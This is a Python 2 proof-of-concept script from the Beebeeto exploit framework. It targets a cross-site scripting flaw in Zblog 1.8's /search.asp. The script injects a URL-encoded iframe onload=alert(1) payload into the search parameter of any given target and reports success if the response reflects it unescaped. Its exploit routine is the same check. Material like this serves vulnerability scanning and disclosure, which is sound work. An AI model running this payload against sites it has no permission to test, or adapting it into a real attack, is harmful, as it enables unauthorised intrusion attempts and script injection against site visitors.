#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0184',
            'name': 'Zblog 1.8 /search.asp XSS漏洞 POC',
            'author': 'user1018',
            'create_date': '2014-12-09',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Zblog',
            'vul_version': ['1.8'],
            'type': 'Cross Site Scripting',
            'tag': ['Zblog漏洞', 'XSS漏洞', '/search.asp', 'asp'],
            'desc': '''
                    search.asp在对用户提交数据处理上存在安全漏洞。
                    ''',
            'references': ['http://sebug.net/vuldb/ssvid-19246',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = '/search.asp?q=%3Ciframe%20src%3D%40%20onload%3Dalert%281%29%3E'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '<iframe src=@ onload=alert(1)>' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())